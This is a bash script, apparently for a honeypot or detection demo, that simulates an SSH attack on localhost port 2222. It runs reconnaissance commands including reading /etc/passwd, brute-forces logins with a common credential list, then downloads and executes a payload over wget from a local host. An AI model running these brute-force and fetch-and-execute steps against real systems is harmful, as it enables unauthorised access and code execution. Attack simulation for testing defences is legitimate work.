#!/bin/bash
echo "[*] Starting realistic attack simulation..."

SSH_OPTS="-p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o PasswordAuthentication=yes -o PubkeyAuthentication=no -o BatchMode=no"

# Phase 1: Reconnaissance
echo "[*] Phase 1: Reconnaissance..."
for i in {1..10}; do
  sshpass -p "password123" ssh $SSH_OPTS root@127.0.0.1 << 'CMDS' 2>/dev/null
whoami
id
uname -a
cat /etc/passwd
exit
CMDS
  sleep 0.2
done

# Phase 2: Brute Force
echo "[*] Phase 2: Brute Force..."
for user in root admin test oracle mysql; do
  for pass in password123 admin123 123456 root toor pass; do
    sshpass -p "$pass" ssh $SSH_OPTS $user@127.0.0.1 -o ConnectTimeout=3 "exit" 2>/dev/null
    sleep 0.1
  done
done

# Phase 3: Command Execution
# NOTE: points at your own host (already in AUTHORIZED_TARGETS) instead of
# an external domain, so this phase never depends on outside network access
# working a specific way during the demo. Before running this script, serve
# a harmless dummy payload there, e.g. from a separate terminal on the host:
#   mkdir -p /tmp/cs_payload && echo 'echo harmless-test-payload' > /tmp/cs_payload/payload.sh
#   cd /tmp/cs_payload && python3 -m http.server 8000
echo "[*] Phase 3: Command Execution..."
for i in {1..10}; do
  sshpass -p "password123" ssh $SSH_OPTS root@127.0.0.1 << 'CMDS' 2>/dev/null
wget http://10.0.2.2:8000/payload.sh
chmod +x payload.sh
./payload.sh
exit
CMDS
  sleep 0.2
done

echo "[+] Attack simulation complete!"
